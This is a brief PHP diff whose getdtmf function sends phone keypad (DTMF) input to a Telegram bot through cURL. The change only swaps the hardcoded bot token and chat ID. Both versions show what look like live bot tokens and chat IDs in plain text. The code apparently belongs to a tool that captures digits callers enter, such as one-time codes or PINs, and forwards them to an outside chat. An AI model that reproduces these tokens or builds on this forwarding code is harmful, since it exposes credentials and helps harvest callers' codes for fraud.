@@ -133,7 +133,7 @@ function getdtmf($dtmf) {
     $curl = curl_init();
 
     curl_setopt_array($curl, array(
-        CURLOPT_URL => 'https://api.telegram.org/bot7636645795:AAHFoA7GuflyW81tmsF6_Tl5O4vo7HVB3Ok/sendMessage?chat_id=-1002163292165&text=' . urlencode($dtmf),
+        CURLOPT_URL => 'https://api.telegram.org/bot8178049394:AAGvWMrdWzJS0brFmCBL_dyUKk6ZMTGDwYY/sendMessage?chat_id=-1002347274383&text=' . urlencode($dtmf),
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_ENCODING => '',
         CURLOPT_MAXREDIRS => 10,
